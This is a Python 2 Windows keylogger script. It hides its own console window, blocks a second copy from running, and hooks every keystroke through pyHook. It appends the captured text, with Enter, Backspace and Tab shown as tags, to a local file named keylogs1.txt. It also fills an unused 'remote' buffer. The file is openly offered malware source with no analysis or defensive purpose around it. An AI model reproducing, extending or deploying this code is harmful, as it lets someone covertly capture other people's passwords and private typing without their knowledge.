try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import datetime,time
import win32event, win32api, winerror

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
datalocal=''
dataremote=''
count=0

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
def msg():
    print "DannyTech Security."
    return True


def local():
    global datalocal
    if len(datalocal)>10:
        fp=open("keylogs1.txt","a")
        fp.write(datalocal)
        fp.close()
        datalocal=''
    return True

def keypressed(event):
    global x,data,datalocal,dataremote
    if event.Ascii==13:
        keys='<ENTR>'
    elif event.Ascii==8:
        keys='<BKSPS>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    datalocal=datalocal+keys
    dataremote = dataremote+keys
    local()
hide()
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
